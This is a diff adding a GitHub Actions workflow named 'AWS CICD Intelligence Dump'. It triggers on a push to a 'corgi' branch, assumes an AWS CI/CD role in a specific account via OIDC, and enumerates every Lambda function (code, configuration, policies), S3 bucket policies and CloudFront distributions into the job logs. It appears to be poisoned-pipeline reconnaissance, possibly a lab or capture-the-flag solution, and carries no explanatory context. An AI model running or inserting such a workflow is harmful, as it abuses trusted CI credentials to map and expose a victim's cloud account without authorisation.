@@ -1,0 +1,73 @@
+name: AWS CICD Intelligence Dump
+
+on:
+  push:
+    branches:
+      - corgi
+
+permissions:
+  id-token: write
+  contents: read
+
+env:
+  AWS_REGION: us-east-1
+  ACCOUNT_ID: "373958419501"
+  ROLE_NAME: "cicdRolePolicy"
+
+jobs:
+  intel:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Assume CICD Role via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::${{ env.ACCOUNT_ID }}:role/${{ env.ROLE_NAME }}
+          aws-region: ${{ env.AWS_REGION }}
+
+      - name: Verify identity
+        run: aws sts get-caller-identity
+
+      # =====================
+      # Lambda enumeration
+      # =====================
+      - name: Lambda - List functions
+        run: aws lambda list-functions
+
+      - name: Lambda - Get function details
+        run: |
+          for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
+            echo "===== $fn ====="
+            aws lambda get-function --function-name "$fn"
+            aws lambda get-function-configuration --function-name "$fn"
+            aws lambda get-policy --function-name "$fn" || true
+          done
+
+      # =====================
+      # S3 enumeration
+      # =====================
+      - name: S3 - List all buckets
+        run: aws s3api list-buckets
+
+      - name: S3 - Get bucket policies
+        run: |
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
+            echo "===== $b ====="
+            aws s3api get-bucket-policy --bucket "$b" || echo "No policy"
+            aws s3api get-bucket-policy-status --bucket "$b" || true
+          done
+
+      # =====================
+      # CloudFront enumeration
+      # =====================
+      - name: CloudFront - List distributions
+        run: aws cloudfront list-distributions
+
+      - name: CloudFront - Get distribution configs
+        run: |
+          for id in $(aws cloudfront list-distributions \
+            --query 'DistributionList.Items[].Id' \
+            --output text); do
+            echo "===== Distribution $id ====="
+            aws cloudfront get-distribution --id "$id"
+          done
